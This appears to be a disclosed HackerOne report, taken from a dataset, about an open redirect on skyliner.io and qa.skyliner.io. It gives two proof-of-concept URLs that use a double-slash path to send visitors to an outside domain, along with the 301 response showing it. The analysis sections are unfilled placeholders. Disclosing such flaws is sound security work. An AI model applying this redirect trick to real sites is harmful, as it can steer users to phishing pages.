---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '162878'
original_report_id: '162878'
title: '[skyliner.io / qa.skyliner.io] Open Redirect'
weakness: Open Redirect
team_handle: skyliner
created_at: '2016-08-24T17:32:29.977Z'
disclosed_at: '2016-09-29T17:24:12.757Z'
has_bounty: false
visibility: full
substate: duplicate
vote_count: 5
tags:
- hackerone
- open-redirect
---

# [skyliner.io / qa.skyliner.io] Open Redirect

## Metadata

- HackerOne Report ID: 162878
- Weakness: Open Redirect
- Program: skyliner
- Disclosed At: 2016-09-29T17:24:12.757Z
- Has Bounty: No
- Visibility: full
- Substate: duplicate

## Original Report

**PoC**
```
https://skyliner.io//blackfan.ru/
https://qa.skyliner.io//blackfan.ru/
```

**HTTP Response**
```
HTTP/1.1 301 Moved Permanently
Content-Length: 0
Connection: close
Date: Wed, 24 Aug 2016 17:30:39 GMT
Location: //blackfan.ru
```

https://cwe.mitre.org/data/definitions/601.html

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
